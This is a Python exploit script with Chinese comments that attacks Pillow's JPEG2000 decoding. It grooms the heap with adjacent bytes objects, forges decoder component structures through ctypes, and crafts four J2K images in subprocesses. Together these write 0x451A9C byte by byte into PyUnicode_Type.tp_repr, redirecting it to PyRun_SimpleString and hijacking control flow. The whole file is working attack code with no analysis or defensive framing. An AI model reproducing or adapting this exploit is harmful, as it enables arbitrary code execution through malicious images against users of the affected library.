#!/usr/bin/env python3
# 终局 v2：两段写把连续 32 位值写进 PyUnicode_Type.tp_repr
#   · payload 编码放在【子进程】（保持本进程堆干净，groom 才不偏）
#   · 只释放一个已验证相邻的空洞 => 数组落进去 => 其上方是 tiles[] => comps 被改写
import ctypes, gc, io, os, subprocess, sys
from PIL import Image

R = lambda a: ctypes.c_uint64.from_address(a).value
TP_REPR = 0xA3C908
VAL = 0x00451A9C


def put64(a, v):
    ctypes.c_uint64.from_address(a).value = v & 0xFFFFFFFFFFFFFFFF


def enc_payload_subproc(path, first_byte):
    """子进程里编码 4-tile(8x8) L 图，首像素 = first_byte"""
    code = ("from PIL import Image\n"
            "vals = [%d] + [0]*255\n"
            "im = Image.new('L', (16, 16))\n"
            "im.putdata(vals)\n"
            "im.save(%r, 'JPEG2000', tile_size=(8, 8), num_resolutions=4)\n" % (first_byte, path))
    subprocess.run([sys.executable, '-c', code], check=True)


def mkfake(target, res_addr):
    buf = bytearray(1024)
    fa = ctypes.addressof((ctypes.c_char * 1024).from_buffer(buf))
    put64(fa + 0x10, 1)          # compno=0, numresolutions=1
    put64(fa + 0x18, 1)
    put64(fa + 0x20, res_addr)
    put64(fa + 0x28, 40)
    put64(fa + 0x30, target)     # ★ data
    put64(fa + 0x38, 0)
    put64(fa + 0x40, 4096)
    put64(fa + 0x48, 4096)
    return buf, fa


def groom_and_decode(path, tries=6):
    for _ in range(tries):
        gc.collect()
        prime = [bytes(519) for _ in range(1024)]
        del prime
        pairs = [(bytes(519), bytes(bytearray(519))) for _ in range(400)]
        good = [(D, B) for (D, B) in pairs if id(B) - id(D) == 0x230]
        if not good:
            del pairs
            continue
        ng = len(good)
        keep = [t for i, t in enumerate(good) if i != len(good) // 2]
        Ks = [B for (D, B) in keep]
        holeD = good[len(good) // 2][0]
        del holeD, pairs, good
        gc.collect()
        M = open(path, 'rb').read()
        try:
            im = Image.open(io.BytesIO(M)); im.load()
            return (im.size, ng)
        except BaseException as e:
            return ("ERR %r" % (e,), ng)
    return (None, 0)


# staging（最先分配，保证地址低/可表达）
res_buf = bytearray(512)
RESADDR = ctypes.addressof((ctypes.c_char * 512).from_buffer(res_buf))
put64(RESADDR + 0x08, 16)
put64(RESADDR + 0x0c, 16)
put64(RESADDR + 0x10, 1)
put64(RESADDR + 0x14, 1)
print("[*] tp_repr 原值 = %#x   目标 = %#x" % (R(TP_REPR), VAL))

enc_payload_subproc('/tmp/qA.j2k', VAL & 0xFF)           # 低字节 0x9c
enc_payload_subproc('/tmp/qB.j2k', (VAL >> 8) & 0xFF)    # 0x1a
enc_payload_subproc('/tmp/qC.j2k', (VAL >> 16) & 0xFF)   # 0x45
enc_payload_subproc('/tmp/qD.j2k', (VAL >> 24) & 0xFF)   # 0x00

for stage, (pay, off) in enumerate([('/tmp/qA.j2k', 0), ('/tmp/qB.j2k', 1),
                                    ('/tmp/qC.j2k', 2), ('/tmp/qD.j2k', 3)], 1):
    fake_buf, FAKE = mkfake(TP_REPR + off, RESADDR)
    A = FAKE - 0x0c
    B = A + 0x1000
    C = A + 0x4000
    r = subprocess.run(['python3', '/tmp/mk13.py', pay, '/tmp/GG.j2k', '0', '23',
                        hex(A), hex(B), hex(C), '-370'], capture_output=True, text=True)
    if 'OK' not in r.stdout:
        print("段%d build 失败: %s" % (stage, (r.stdout + r.stderr)[:70])); sys.exit(1)
    res, ng = groom_and_decode('/tmp/GG.j2k')
    print("[*] 段%d: data=%#x 解码=%s 相邻对=%d  tp_repr=%#x"
          % (stage, TP_REPR + off, res, ng, R(TP_REPR)))

final = R(TP_REPR)
print()
print("[*] 最终 tp_repr = %#x   期望 = %#x" % (final, VAL))
if (final & 0xFFFFFFFF) == VAL:
    print("\n★★★ 连续 32 位值写入成立：PyUnicode_Type.tp_repr = PyRun_SimpleString(0x451a9c)")
    print("    => 多段拼装 ⇒ 任意字段任意值 ⇒ 控制流改写入口打通")